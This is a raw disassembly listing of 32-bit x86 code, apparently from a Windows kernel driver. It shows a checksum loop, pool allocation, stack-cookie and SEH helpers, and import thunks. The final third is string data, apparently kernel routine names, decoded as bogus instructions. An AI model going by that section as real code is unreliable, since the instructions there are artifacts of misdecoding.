   1d94a:	and    ebx,ecx
   1d94c:	xor    eax,DWORD PTR [ebx*4+0x7c740]
   1d953:	mov    ebx,edx
   1d955:	shr    ebx,0x18
   1d958:	xor    eax,DWORD PTR [ebx*4+0x7bf40]
   1d95f:	and    edx,ecx
   1d961:	xor    eax,DWORD PTR [edx*4+0x7cb40]
   1d968:	dec    DWORD PTR [ebp-0x4]
   1d96b:	jne    0x1d7bc
   1d971:	cmp    DWORD PTR [ebp+0x8],edi
   1d974:	jb     0x1d9be
   1d976:	mov    edx,DWORD PTR [ebp+0x8]
   1d979:	shr    edx,0x2
   1d97c:	mov    DWORD PTR [ebp-0x4],edx
   1d97f:	xor    eax,DWORD PTR [esi]
   1d981:	sub    DWORD PTR [ebp+0x8],edi
   1d984:	mov    edx,eax
   1d986:	shr    edx,0x10
   1d989:	and    edx,ecx
   1d98b:	mov    edx,DWORD PTR [edx*4+0x7c340]
   1d992:	mov    ebx,eax
   1d994:	shr    ebx,0x8
   1d997:	and    ebx,ecx
   1d999:	xor    edx,DWORD PTR [ebx*4+0x7c740]
   1d9a0:	mov    ebx,eax
   1d9a2:	shr    ebx,0x18
   1d9a5:	xor    edx,DWORD PTR [ebx*4+0x7bf40]
   1d9ac:	and    eax,ecx
   1d9ae:	xor    edx,DWORD PTR [eax*4+0x7cb40]
   1d9b5:	add    esi,edi
   1d9b7:	dec    DWORD PTR [ebp-0x4]
   1d9ba:	mov    eax,edx
   1d9bc:	jne    0x1d97f
   1d9be:	cmp    DWORD PTR [ebp+0x8],0x0
   1d9c2:	pop    edi
   1d9c3:	pop    ebx
   1d9c4:	je     0x1d9dd
   1d9c6:	movzx  edx,BYTE PTR [esi]
   1d9c9:	xor    edx,eax
   1d9cb:	and    edx,ecx
   1d9cd:	shr    eax,0x8
   1d9d0:	xor    eax,DWORD PTR [edx*4+0x7bf40]
   1d9d7:	inc    esi
   1d9d8:	dec    DWORD PTR [ebp+0x8]
   1d9db:	jne    0x1d9c6
   1d9dd:	not    eax
   1d9df:	pop    esi
   1d9e0:	leave  
   1d9e1:	ret    0x4
   1d9e4:	int3   
   1d9e5:	int3   
   1d9e6:	int3   
   1d9e7:	int3   
   1d9e8:	int3   
   1d9e9:	int3   
   1d9ea:	mov    edi,edi
   1d9ec:	push   ebp
   1d9ed:	mov    ebp,esp
   1d9ef:	mov    edx,DWORD PTR [ebp+0xc]
   1d9f2:	test   edx,edx
   1d9f4:	jne    0x1d9fa
   1d9f6:	xor    eax,eax
   1d9f8:	jmp    0x1da05
   1d9fa:	push   DWORD PTR [ebp+0x10]
   1d9fd:	mov    eax,DWORD PTR [ebp+0x8]
   1da00:	call   0x1d772
   1da05:	pop    ebp
   1da06:	ret    0xc
   1da09:	int3   
   1da0a:	int3   
   1da0b:	int3   
   1da0c:	int3   
   1da0d:	int3   
   1da0e:	mov    edi,edi
   1da10:	push   ebp
   1da11:	mov    ebp,esp
   1da13:	push   0x20
   1da15:	push   0x61737973
   1da1a:	push   DWORD PTR [ebp+0x8]
   1da1d:	push   0x1
   1da1f:	call   DWORD PTR ds:0x1ee18
   1da25:	test   eax,eax
   1da27:	jne    0x1da34
   1da29:	push   0xc000009a
   1da2e:	call   DWORD PTR ds:0x1ee14
   1da34:	pop    ebp
   1da35:	ret    
   1da36:	int3   
   1da37:	int3   
   1da38:	int3   
   1da39:	int3   
   1da3a:	int3   
   1da3b:	cmp    ecx,DWORD PTR ds:0x7eb38
   1da41:	jne    0x1da46
   1da43:	ret    0x0
   1da46:	jmp    0x1da50
   1da4b:	int3   
   1da4c:	int3   
   1da4d:	int3   
   1da4e:	int3   
   1da4f:	int3   
   1da50:	mov    edi,edi
   1da52:	push   ebp
   1da53:	mov    ebp,esp
   1da55:	push   ecx
   1da56:	mov    DWORD PTR [ebp-0x4],ecx
   1da59:	push   0x0
   1da5b:	push   DWORD PTR ds:0x7eb3c
   1da61:	push   DWORD PTR ds:0x7eb38
   1da67:	push   DWORD PTR [ebp-0x4]
   1da6a:	push   0xf7
   1da6f:	call   DWORD PTR ds:0x1ee5c
   1da75:	int3   
   1da76:	int3   
   1da77:	int3   
   1da78:	int3   
   1da79:	int3   
   1da7a:	int3   
   1da7b:	int3   
   1da7c:	jmp    DWORD PTR ds:0x1ee08
   1da82:	int3   
   1da83:	int3   
   1da84:	int3   
   1da85:	int3   
   1da86:	int3   
   1da87:	int3   
   1da88:	jmp    DWORD PTR ds:0x1ee0c
   1da8e:	int3   
   1da8f:	int3   
   1da90:	int3   
   1da91:	int3   
   1da92:	int3   
   1da93:	int3   
   1da94:	jmp    DWORD PTR ds:0x1ee10
   1da9a:	int3   
   1da9b:	int3   
   1da9c:	int3   
   1da9d:	int3   
   1da9e:	int3   
   1da9f:	int3   
   1daa0:	jmp    DWORD PTR ds:0x1ee30
   1daa6:	int3   
   1daa7:	int3   
   1daa8:	int3   
   1daa9:	int3   
   1daaa:	int3   
   1daab:	int3   
   1daac:	jmp    DWORD PTR ds:0x1ee38
   1dab2:	int3   
   1dab3:	int3   
   1dab4:	int3   
   1dab5:	int3   
   1dab6:	int3   
   1dab7:	int3   
   1dab8:	jmp    DWORD PTR ds:0x1ee3c
   1dabe:	int3   
   1dabf:	int3   
   1dac0:	int3   
   1dac1:	int3   
   1dac2:	int3   
   1dac3:	int3   
   1dac4:	jmp    DWORD PTR ds:0x1ee48
   1daca:	int3   
   1dacb:	int3   
   1dacc:	int3   
   1dacd:	int3   
   1dace:	int3   
   1dacf:	int3   
   1dad0:	jmp    DWORD PTR ds:0x1ee50
   1dad6:	int3   
   1dad7:	int3   
   1dad8:	int3   
   1dad9:	int3   
   1dada:	int3   
   1dadb:	int3   
   1dadc:	push   0x1db40
   1dae1:	push   DWORD PTR fs:0x0
   1dae8:	mov    eax,DWORD PTR [esp+0x10]
   1daec:	mov    DWORD PTR [esp+0x10],ebp
   1daf0:	lea    ebp,[esp+0x10]
   1daf4:	sub    esp,eax
   1daf6:	push   ebx
   1daf7:	push   esi
   1daf8:	push   edi
   1daf9:	mov    eax,ds:0x7eb38
   1dafe:	xor    DWORD PTR [ebp-0x4],eax
   1db01:	xor    eax,ebp
   1db03:	push   eax
   1db04:	mov    DWORD PTR [ebp-0x18],esp
   1db07:	push   DWORD PTR [ebp-0x8]
   1db0a:	mov    eax,DWORD PTR [ebp-0x4]
   1db0d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1db14:	mov    DWORD PTR [ebp-0x8],eax
   1db17:	lea    eax,[ebp-0x10]
   1db1a:	mov    fs:0x0,eax
   1db20:	ret    
   1db21:	mov    ecx,DWORD PTR [ebp-0x10]
   1db24:	mov    DWORD PTR fs:0x0,ecx
   1db2b:	pop    ecx
   1db2c:	pop    edi
   1db2d:	pop    edi
   1db2e:	pop    esi
   1db2f:	pop    ebx
   1db30:	mov    esp,ebp
   1db32:	pop    ebp
   1db33:	push   ecx
   1db34:	ret    
   1db35:	int3   
   1db36:	int3   
   1db37:	int3   
   1db38:	int3   
   1db39:	int3   
   1db3a:	int3   
   1db3b:	int3   
   1db3c:	int3   
   1db3d:	int3   
   1db3e:	int3   
   1db3f:	int3   
   1db40:	mov    edi,edi
   1db42:	push   ebp
   1db43:	mov    ebp,esp
   1db45:	sub    esp,0x14
   1db48:	push   ebx
   1db49:	mov    ebx,DWORD PTR [ebp+0xc]
   1db4c:	push   esi
   1db4d:	mov    esi,DWORD PTR [ebx+0x8]
   1db50:	xor    esi,DWORD PTR ds:0x7eb38
   1db56:	push   edi
   1db57:	mov    eax,DWORD PTR [esi]
   1db59:	mov    BYTE PTR [ebp-0x1],0x0
   1db5d:	mov    DWORD PTR [ebp-0x8],0x1
   1db64:	lea    edi,[ebx+0x10]
   1db67:	cmp    eax,0xfffffffe
   1db6a:	je     0x1db79
   1db6c:	mov    ecx,DWORD PTR [esi+0x4]
   1db6f:	add    ecx,edi
   1db71:	xor    ecx,DWORD PTR [eax+edi*1]
   1db74:	call   0x1da3b
   1db79:	mov    ecx,DWORD PTR [esi+0xc]
   1db7c:	mov    eax,DWORD PTR [esi+0x8]
   1db7f:	add    ecx,edi
   1db81:	xor    ecx,DWORD PTR [eax+edi*1]
   1db84:	call   0x1da3b
   1db89:	mov    eax,DWORD PTR [ebp+0x8]
   1db8c:	test   BYTE PTR [eax+0x4],0x66
   1db90:	jne    0x1dc78
   1db96:	mov    ecx,DWORD PTR [ebp+0x10]
   1db99:	lea    edx,[ebp-0x14]
   1db9c:	mov    DWORD PTR [ebx-0x4],edx
   1db9f:	mov    ebx,DWORD PTR [ebx+0xc]
   1dba2:	mov    DWORD PTR [ebp-0x14],eax
   1dba5:	mov    DWORD PTR [ebp-0x10],ecx
   1dba8:	cmp    ebx,0xfffffffe
   1dbab:	je     0x1dc0c
   1dbad:	lea    ecx,[ecx+0x0]
   1dbb0:	lea    eax,[ebx+ebx*2]
   1dbb3:	mov    ecx,DWORD PTR [esi+eax*4+0x14]
   1dbb7:	lea    eax,[esi+eax*4+0x10]
   1dbbb:	mov    DWORD PTR [ebp-0xc],eax
   1dbbe:	mov    eax,DWORD PTR [eax]
   1dbc0:	mov    DWORD PTR [ebp+0x8],eax
   1dbc3:	test   ecx,ecx
   1dbc5:	je     0x1dbdb
   1dbc7:	mov    edx,edi
   1dbc9:	call   0x1dd81
   1dbce:	mov    BYTE PTR [ebp-0x1],0x1
   1dbd2:	test   eax,eax
   1dbd4:	jl     0x1dc16
   1dbd6:	jg     0x1dc1f
   1dbd8:	mov    eax,DWORD PTR [ebp+0x8]
   1dbdb:	mov    ebx,eax
   1dbdd:	cmp    eax,0xfffffffe
   1dbe0:	jne    0x1dbb0
   1dbe2:	cmp    BYTE PTR [ebp-0x1],0x0
   1dbe6:	je     0x1dc0c
   1dbe8:	mov    eax,DWORD PTR [esi]
   1dbea:	cmp    eax,0xfffffffe
   1dbed:	je     0x1dbfc
   1dbef:	mov    ecx,DWORD PTR [esi+0x4]
   1dbf2:	add    ecx,edi
   1dbf4:	xor    ecx,DWORD PTR [eax+edi*1]
   1dbf7:	call   0x1da3b
   1dbfc:	mov    ecx,DWORD PTR [esi+0xc]
   1dbff:	mov    edx,DWORD PTR [esi+0x8]
   1dc02:	add    ecx,edi
   1dc04:	xor    ecx,DWORD PTR [edx+edi*1]
   1dc07:	call   0x1da3b
   1dc0c:	mov    eax,DWORD PTR [ebp-0x8]
   1dc0f:	pop    edi
   1dc10:	pop    esi
   1dc11:	pop    ebx
   1dc12:	mov    esp,ebp
   1dc14:	pop    ebp
   1dc15:	ret    
   1dc16:	mov    DWORD PTR [ebp-0x8],0x0
   1dc1d:	jmp    0x1dbe8
   1dc1f:	mov    ecx,DWORD PTR [ebp+0xc]
   1dc22:	call   0x1ddaa
   1dc27:	mov    eax,DWORD PTR [ebp+0xc]
   1dc2a:	cmp    DWORD PTR [eax+0xc],ebx
   1dc2d:	je     0x1dc41
   1dc2f:	push   0x7eb38
   1dc34:	push   edi
   1dc35:	mov    edx,ebx
   1dc37:	mov    ecx,eax
   1dc39:	call   0x1ddc4
   1dc3e:	mov    eax,DWORD PTR [ebp+0xc]
   1dc41:	mov    ecx,DWORD PTR [ebp+0x8]
   1dc44:	mov    DWORD PTR [eax+0xc],ecx
   1dc47:	mov    eax,DWORD PTR [esi]
   1dc49:	cmp    eax,0xfffffffe
   1dc4c:	je     0x1dc5b
   1dc4e:	mov    ecx,DWORD PTR [esi+0x4]
   1dc51:	add    ecx,edi
   1dc53:	xor    ecx,DWORD PTR [eax+edi*1]
   1dc56:	call   0x1da3b
   1dc5b:	mov    ecx,DWORD PTR [esi+0xc]
   1dc5e:	mov    edx,DWORD PTR [esi+0x8]
   1dc61:	add    ecx,edi
   1dc63:	xor    ecx,DWORD PTR [edx+edi*1]
   1dc66:	call   0x1da3b
   1dc6b:	mov    eax,DWORD PTR [ebp-0xc]
   1dc6e:	mov    ecx,DWORD PTR [eax+0x8]
   1dc71:	mov    edx,edi
   1dc73:	call   0x1dd98
   1dc78:	mov    edx,0xfffffffe
   1dc7d:	cmp    DWORD PTR [ebx+0xc],edx
   1dc80:	je     0x1dc0c
   1dc82:	push   0x7eb38
   1dc87:	push   edi
   1dc88:	mov    ecx,ebx
   1dc8a:	call   0x1ddc4
   1dc8f:	jmp    0x1dbe8
   1dc94:	int3   
   1dc95:	int3   
   1dc96:	int3   
   1dc97:	int3   
   1dc98:	int3   
   1dc99:	int3   
   1dc9a:	int3   
   1dc9b:	int3   
   1dc9c:	push   ebx
   1dc9d:	push   esi
   1dc9e:	push   edi
   1dc9f:	mov    edx,DWORD PTR [esp+0x10]
   1dca3:	mov    eax,DWORD PTR [esp+0x14]
   1dca7:	mov    ecx,DWORD PTR [esp+0x18]
   1dcab:	push   ebp
   1dcac:	push   edx
   1dcad:	push   eax
   1dcae:	push   ecx
   1dcaf:	push   ecx
   1dcb0:	push   0x1dd1f
   1dcb5:	push   DWORD PTR fs:0x0
   1dcbc:	mov    eax,ds:0x7eb38
   1dcc1:	xor    eax,esp
   1dcc3:	mov    DWORD PTR [esp+0x8],eax
   1dcc7:	mov    DWORD PTR fs:0x0,esp
   1dcce:	mov    eax,DWORD PTR [esp+0x30]
   1dcd2:	mov    ebx,DWORD PTR [eax+0x8]
   1dcd5:	mov    ecx,DWORD PTR [esp+0x2c]
   1dcd9:	xor    ebx,DWORD PTR [ecx]
   1dcdb:	mov    esi,DWORD PTR [eax+0xc]
   1dcde:	cmp    esi,0xfffffffe
   1dce1:	je     0x1dd11
   1dce3:	mov    edx,DWORD PTR [esp+0x34]
   1dce7:	cmp    edx,0xfffffffe
   1dcea:	je     0x1dcf0
   1dcec:	cmp    esi,edx
   1dcee:	jbe    0x1dd11
   1dcf0:	lea    esi,[esi+esi*2]
   1dcf3:	lea    ebx,[ebx+esi*4+0x10]
   1dcf7:	mov    ecx,DWORD PTR [ebx]
   1dcf9:	mov    DWORD PTR [eax+0xc],ecx
   1dcfc:	cmp    DWORD PTR [ebx+0x4],0x0
   1dd00:	jne    0x1dcce
   1dd02:	mov    ecx,0x1
   1dd07:	mov    eax,DWORD PTR [ebx+0x8]
   1dd0a:	call   0x1de3c
   1dd0f:	jmp    0x1dcce
   1dd11:	pop    DWORD PTR fs:0x0
   1dd18:	add    esp,0x18
   1dd1b:	pop    edi
   1dd1c:	pop    esi
   1dd1d:	pop    ebx
   1dd1e:	ret    
   1dd1f:	mov    ecx,DWORD PTR [esp+0x4]
   1dd23:	test   DWORD PTR [ecx+0x4],0x6
   1dd2a:	mov    eax,0x1
   1dd2f:	je     0x1dd64
   1dd31:	mov    eax,DWORD PTR [esp+0x8]
   1dd35:	mov    ecx,DWORD PTR [eax+0x8]
   1dd38:	xor    ecx,eax
   1dd3a:	call   0x1da3b
   1dd3f:	push   ebp
   1dd40:	mov    ebp,DWORD PTR [eax+0x18]
   1dd43:	push   DWORD PTR [eax+0xc]
   1dd46:	push   DWORD PTR [eax+0x10]
   1dd49:	push   DWORD PTR [eax+0x14]
   1dd4c:	call   0x1dc9c
   1dd51:	add    esp,0xc
   1dd54:	pop    ebp
   1dd55:	mov    eax,DWORD PTR [esp+0x8]
   1dd59:	mov    edx,DWORD PTR [esp+0x10]
   1dd5d:	mov    DWORD PTR [edx],eax
   1dd5f:	mov    eax,0x3
   1dd64:	ret    
   1dd65:	push   ebp
   1dd66:	mov    ecx,DWORD PTR [esp+0x8]
   1dd6a:	mov    ebp,DWORD PTR [ecx]
   1dd6c:	push   DWORD PTR [ecx+0x1c]
   1dd6f:	push   DWORD PTR [ecx+0x18]
   1dd72:	push   DWORD PTR [ecx+0x28]
   1dd75:	call   0x1dc9c
   1dd7a:	add    esp,0xc
   1dd7d:	pop    ebp
   1dd7e:	ret    0x4
   1dd81:	push   ebp
   1dd82:	push   esi
   1dd83:	push   edi
   1dd84:	push   ebx
   1dd85:	mov    ebp,edx
   1dd87:	xor    eax,eax
   1dd89:	xor    ebx,ebx
   1dd8b:	xor    edx,edx
   1dd8d:	xor    esi,esi
   1dd8f:	xor    edi,edi
   1dd91:	call   ecx
   1dd93:	pop    ebx
   1dd94:	pop    edi
   1dd95:	pop    esi
   1dd96:	pop    ebp
   1dd97:	ret    
   1dd98:	mov    ebp,edx
   1dd9a:	mov    esi,ecx
   1dd9c:	mov    eax,ecx
   1dd9e:	xor    eax,eax
   1dda0:	xor    ebx,ebx
   1dda2:	xor    ecx,ecx
   1dda4:	xor    edx,edx
   1dda6:	xor    edi,edi
   1dda8:	jmp    esi
   1ddaa:	push   ebp
   1ddab:	mov    ebp,esp
   1ddad:	push   ebx
   1ddae:	push   esi
   1ddaf:	push   edi
   1ddb0:	push   0x0
   1ddb2:	push   0x0
   1ddb4:	push   0x1ddbf
   1ddb9:	push   ecx
   1ddba:	call   0x1de44
   1ddbf:	pop    edi
   1ddc0:	pop    esi
   1ddc1:	pop    ebx
   1ddc2:	pop    ebp
   1ddc3:	ret    
   1ddc4:	push   ebp
   1ddc5:	mov    ebp,DWORD PTR [esp+0x8]
   1ddc9:	push   edx
   1ddca:	push   ecx
   1ddcb:	push   DWORD PTR [esp+0x14]
   1ddcf:	call   0x1dc9c
   1ddd4:	add    esp,0xc
   1ddd7:	pop    ebp
   1ddd8:	ret    0x8
   1dddb:	int3   
   1dddc:	int3   
   1dddd:	int3   
   1ddde:	int3   
   1dddf:	int3   
   1dde0:	push   0x1db40
   1dde5:	push   DWORD PTR fs:0x0
   1ddec:	mov    eax,DWORD PTR [esp+0x10]
   1ddf0:	mov    DWORD PTR [esp+0x10],ebp
   1ddf4:	lea    ebp,[esp+0x10]
   1ddf8:	sub    esp,eax
   1ddfa:	push   ebx
   1ddfb:	push   esi
   1ddfc:	push   edi
   1ddfd:	mov    eax,ds:0x7eb38
   1de02:	xor    DWORD PTR [ebp-0x4],eax
   1de05:	xor    eax,ebp
   1de07:	mov    DWORD PTR [ebp-0x1c],eax
   1de0a:	push   eax
   1de0b:	mov    DWORD PTR [ebp-0x18],esp
   1de0e:	push   DWORD PTR [ebp-0x8]
   1de11:	mov    eax,DWORD PTR [ebp-0x4]
   1de14:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1de1b:	mov    DWORD PTR [ebp-0x8],eax
   1de1e:	lea    eax,[ebp-0x10]
   1de21:	mov    fs:0x0,eax
   1de27:	ret    
   1de28:	mov    ecx,DWORD PTR [ebp-0x1c]
   1de2b:	xor    ecx,ebp
   1de2d:	call   0x1da3b
   1de32:	jmp    0x1db21
   1de37:	int3   
   1de38:	int3   
   1de39:	int3   
   1de3a:	int3   
   1de3b:	int3   
   1de3c:	call   eax
   1de3e:	ret    
   1de3f:	int3   
   1de40:	int3   
   1de41:	int3   
   1de42:	int3   
   1de43:	int3   
   1de44:	jmp    DWORD PTR ds:0x1ee68
   1de4a:	pop    esp
   1de4b:	add    BYTE PTR [eax],al
   1de4d:	add    BYTE PTR [eax],al
   1de4f:	add    BYTE PTR [ebx+0x0],ch
   1de52:	bound  eax,QWORD PTR [eax]
   1de54:	add    BYTE PTR fs:[ecx+0x0],dh
   1de58:	add    BYTE PTR [eax],al
   1de5a:	add    BYTE PTR fs:[ebx],dh
   1de5d:	add    BYTE PTR [eax+eax*1+0x73],ah
   1de61:	add    BYTE PTR [eax],al
   1de63:	add    BYTE PTR [esi+0x0],ch
   1de66:	je     0x1de68
   1de68:	outs   dx,BYTE PTR ds:[esi]
   1de69:	add    BYTE PTR [eax],al
   1de6b:	add    BYTE PTR [ebx+0x0],dh
   1de6e:	jns    0x1de70
   1de70:	jae    0x1de72
   1de72:	popa   
   1de73:	add    BYTE PTR [eax],al
   1de75:	add    BYTE PTR [edi+0x0],dh
   1de78:	imul   eax,DWORD PTR [eax],0x65006e
   1de7e:	add    BYTE PTR [eax],al
   1de80:	jo     0x1de82
   1de82:	arpl   WORD PTR [eax],ax
   1de84:	imul   eax,DWORD PTR [eax],0x6d0000
   1de8a:	jae    0x1de8c
   1de8c:	jb     0x1de8e
   1de8e:	add    BYTE PTR [eax],al
   1de90:	je     0x1de92
   1de92:	ins    DWORD PTR es:[edi],dx
   1de93:	add    BYTE PTR [eax+0x0],dh
   1de96:	add    BYTE PTR [eax],al
   1de98:	jne    0x1de9a
   1de9a:	jae    0x1de9c
   1de9c:	bound  eax,QWORD PTR [eax]
   1de9e:	add    BYTE PTR [eax],al
   1dea0:	outs   dx,DWORD PTR ds:[esi]
   1dea1:	add    BYTE PTR [eax+eax*1+0x65],ch
   1dea5:	add    BYTE PTR [eax],al
   1dea7:	add    BYTE PTR [ecx+0x0],ah
   1deaa:	imul   eax,DWORD PTR [eax],0x70
   1deb0:	push   0x0
   1deb2:	popa   
   1deb3:	add    BYTE PTR [ecx+0x0],bh
   1deb6:	add    BYTE PTR [eax],al
   1deb8:	jbe    0x1deba
   1deba:	add    BYTE PTR gs:[edx+0x0],dh
   1debe:	add    BYTE PTR [eax],al
   1dec0:	jae    0x1dec2
   1dec2:	popa   
   1dec3:	add    BYTE PTR [ecx+0x0],ch
   1dec6:	add    BYTE PTR [eax],al
   1dec8:	ins    BYTE PTR es:[edi],dx
   1dec9:	add    BYTE PTR [ecx+0x0],ah
   1decc:	arpl   WORD PTR [eax],ax
   1dece:	add    BYTE PTR [eax],al
   1ded0:	push   0x0
   1ded2:	jo     0x1ded4
   1ded4:	add    BYTE PTR [bx+si],al
   1ded7:	add    BYTE PTR [eax+0x0],ch
   1deda:	imul   eax,DWORD PTR [eax],0x64
   1dee0:	jo     0x1dee2
   1dee2:	outs   dx,BYTE PTR ds:[esi]
   1dee3:	add    BYTE PTR [edi+0x0],ah
   1dee6:	add    BYTE PTR [eax],al
   1dee8:	outs   dx,BYTE PTR ds:[esi]
   1dee9:	add    BYTE PTR [eax+eax*1+0x71],dh
   1deed:	add    BYTE PTR [eax],al
   1deef:	add    BYTE PTR [eax],al
   1def1:	int3   
   1def2:	dec    ebx
   1def3:	add    BYTE PTR [ebp+0x0],ah
   1def6:	push   ebx
   1def7:	add    BYTE PTR [ebp+0x0],ah
   1defa:	jb     0x1defc
   1defc:	jbe    0x1defe
   1defe:	imul   eax,DWORD PTR [eax],0x650063
   1df04:	inc    esp
   1df05:	add    BYTE PTR [ebp+0x0],ah
   1df08:	jae    0x1df0a
   1df0a:	arpl   WORD PTR [eax],ax
   1df0c:	jb     0x1df0e
   1df0e:	imul   eax,DWORD PTR [eax],0x740070
   1df14:	outs   dx,DWORD PTR ds:[esi]
   1df15:	add    BYTE PTR [edx+0x0],dh
   1df18:	push   esp
   1df19:	add    BYTE PTR [ecx+0x0],ah
   1df1c:	bound  eax,QWORD PTR [eax]
   1df1e:	ins    BYTE PTR es:[edi],dx
   1df1f:	add    BYTE PTR [ebp+0x0],ah
   1df22:	add    BYTE PTR [eax],al
   1df24:	pop    edx
   1df25:	add    BYTE PTR [edi+0x0],dh
   1df28:	dec    edi
   1df29:	add    BYTE PTR [eax+0x0],dh
   1df2c:	add    BYTE PTR gs:[esi+0x0],ch
   1df30:	push   eax
   1df31:	add    BYTE PTR [edx+0x0],dh
   1df34:	outs   dx,DWORD PTR ds:[esi]
   1df35:	add    BYTE PTR [ebx+0x0],ah
   1df38:	add    BYTE PTR gs:[ebx+0x0],dh
   1df3c:	jae    0x1df3e
   1df3e:	add    BYTE PTR [eax],al
   1df40:	push   eax
   1df41:	add    BYTE PTR [ebx+0x0],dh
   1df44:	push   ebx
   1df45:	add    BYTE PTR [ebp+0x0],ah
   1df48:	je     0x1df4a
   1df4a:	dec    esp
   1df4b:	add    BYTE PTR [edi+0x0],ch
   1df4e:	popa   
   1df4f:	add    BYTE PTR [eax+eax*1+0x49],ah
   1df53:	add    BYTE PTR [ebp+0x0],ch
   1df56:	popa   
   1df57:	add    BYTE PTR [edi+0x0],ah
   1df5a:	add    BYTE PTR gs:[esi+0x0],cl
   1df5e:	outs   dx,DWORD PTR ds:[esi]
   1df5f:	add    BYTE PTR [eax+eax*1+0x69],dh
   1df63:	add    BYTE PTR [esi+0x0],ah
   1df66:	jns    0x1df68
   1df68:	push   edx
   1df69:	add    BYTE PTR [edi+0x0],ch
   1df6c:	jne    0x1df6e
   1df6e:	je     0x1df70
   1df70:	imul   eax,DWORD PTR [eax],0x65006e
   1df76:	add    BYTE PTR [eax],al
   1df78:	pop    edx
   1df79:	add    BYTE PTR [edi+0x0],dh
   1df7c:	inc    esp
   1df7d:	add    BYTE PTR [ebp+0x0],dh
   1df80:	jo     0x1df82
   1df82:	ins    BYTE PTR es:[edi],dx
   1df83:	add    BYTE PTR [ecx+0x0],ch
   1df86:	arpl   WORD PTR [eax],ax
   1df88:	popa   
   1df89:	add    BYTE PTR [eax+eax*1+0x65],dh
   1df8d:	add    BYTE PTR [eax+eax*1+0x6f],dl
   1df91:	add    BYTE PTR [ebx+0x0],ch
   1df94:	add    BYTE PTR gs:[esi+0x0],ch
   1df98:	add    BYTE PTR [eax],al
   1df9a:	push   eax
   1df9b:	add    BYTE PTR [ebx+0x0],dh
   1df9e:	push   ebx
   1df9f:	add    BYTE PTR [ebp+0x0],ah
   1dfa2:	je     0x1dfa4
   1dfa4:	inc    ebx
   1dfa5:	add    BYTE PTR [edx+0x0],dh
   1dfa8:	add    BYTE PTR gs:[ecx+0x0],ah
   1dfac:	je     0x1dfae
   1dfae:	add    BYTE PTR gs:[eax+0x0],dl
   1dfb2:	jb     0x1dfb4
   1dfb4:	outs   dx,DWORD PTR ds:[esi]
   1dfb5:	add    BYTE PTR [ebx+0x0],ah
   1dfb8:	add    BYTE PTR gs:[ebx+0x0],dh
   1dfbc:	jae    0x1dfbe
   1dfbe:	dec    esi
   1dfbf:	add    BYTE PTR [edi+0x0],ch
   1dfc2:	je     0x1dfc4
   1dfc4:	imul   eax,DWORD PTR [eax],0x790066
   1dfca:	push   edx
   1dfcb:	add    BYTE PTR [edi+0x0],ch
   1dfce:	jne    0x1dfd0
   1dfd0:	je     0x1dfd2
   1dfd2:	imul   eax,DWORD PTR [eax],0x65006e
   1dfd8:	add    BYTE PTR [eax],al
   1dfda:	pop    edx
   1dfdb:	add    BYTE PTR [edi+0x0],dh
   1dfde:	dec    edi
   1dfdf:	add    BYTE PTR [eax+0x0],dh
   1dfe2:	add    BYTE PTR gs:[esi+0x0],ch
   1dfe6:	inc    esi
   1dfe7:	add    BYTE PTR [ecx+0x0],ch
   1dfea:	ins    BYTE PTR es:[edi],dx
   1dfeb:	add    BYTE PTR [ebp+0x0],ah
   1dfee:	add    BYTE PTR [eax],al
   1dff0:	pop    edx
   1dff1:	add    BYTE PTR [edi+0x0],dh
   1dff4:	push   ecx
   1dff5:	add    BYTE PTR [ebp+0x0],dh
   1dff8:	add    BYTE PTR gs:[edx+0x0],dh
   1dffc:	jns    0x1dffe
   1dffe:	dec    ecx
   1dfff:	add    BYTE PTR [esi+0x0],ch
   1e002:	data16 add BYTE PTR [edi+0x0],ch
   1e006:	jb     0x1e008
   1e008:	ins    DWORD PTR es:[edi],dx
   1e009:	add    BYTE PTR [ecx+0x0],ah
   1e00c:	je     0x1e00e
   1e00e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e014:	push   eax
   1e015:	add    BYTE PTR [edx+0x0],dh
   1e018:	outs   dx,DWORD PTR ds:[esi]
   1e019:	add    BYTE PTR [ebx+0x0],ah
   1e01c:	add    BYTE PTR gs:[ebx+0x0],dh
   1e020:	jae    0x1e022
   1e022:	add    BYTE PTR [eax],al
   1e024:	pop    edx
   1e025:	add    BYTE PTR [edi+0x0],dh
   1e028:	push   ecx
   1e029:	add    BYTE PTR [ebp+0x0],dh
   1e02c:	add    BYTE PTR gs:[edx+0x0],dh
   1e030:	jns    0x1e032
   1e032:	push   ebx
   1e033:	add    BYTE PTR [ecx+0x0],bh
   1e036:	jae    0x1e038
   1e038:	je     0x1e03a
   1e03a:	add    BYTE PTR gs:[ebp+0x0],ch
   1e03e:	dec    ecx
   1e03f:	add    BYTE PTR [esi+0x0],ch
   1e042:	data16 add BYTE PTR [edi+0x0],ch
   1e046:	jb     0x1e048
   1e048:	ins    DWORD PTR es:[edi],dx
   1e049:	add    BYTE PTR [ecx+0x0],ah
   1e04c:	je     0x1e04e
   1e04e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e054:	add    BYTE PTR [eax],al
   1e056:	pop    edx
   1e057:	add    BYTE PTR [edi+0x0],dh
   1e05a:	dec    edi
   1e05b:	add    BYTE PTR [eax+0x0],dh
   1e05e:	add    BYTE PTR gs:[esi+0x0],ch
   1e062:	dec    ebx
   1e063:	add    BYTE PTR [ebp+0x0],ah
   1e066:	jns    0x1e068
   1e068:	add    BYTE PTR [eax],al
   1e06a:	pop    edx
   1e06b:	add    BYTE PTR [edi+0x0],dh
   1e06e:	inc    esp
   1e06f:	add    BYTE PTR [ebp+0x0],ah
   1e072:	ins    BYTE PTR es:[edi],dx
   1e073:	add    BYTE PTR [ebp+0x0],ah
   1e076:	je     0x1e078
   1e078:	add    BYTE PTR gs:[ebx+0x0],cl
   1e07c:	add    BYTE PTR gs:[ecx+0x0],bh
   1e080:	add    BYTE PTR [eax],al
   1e082:	pop    edx
   1e083:	add    BYTE PTR [edi+0x0],dh
   1e086:	push   ebx
   1e087:	add    BYTE PTR [ebp+0x0],ah
   1e08a:	je     0x1e08c
   1e08c:	push   esi
   1e08d:	add    BYTE PTR [ecx+0x0],ah
   1e090:	ins    BYTE PTR es:[edi],dx
   1e091:	add    BYTE PTR [ebp+0x0],dh
   1e094:	add    BYTE PTR gs:[ebx+0x0],cl
   1e098:	add    BYTE PTR gs:[ecx+0x0],bh
   1e09c:	add    BYTE PTR [eax],al
   1e09e:	pop    edx
   1e09f:	add    BYTE PTR [edi+0x0],dh
   1e0a2:	push   ecx
   1e0a3:	add    BYTE PTR [ebp+0x0],dh
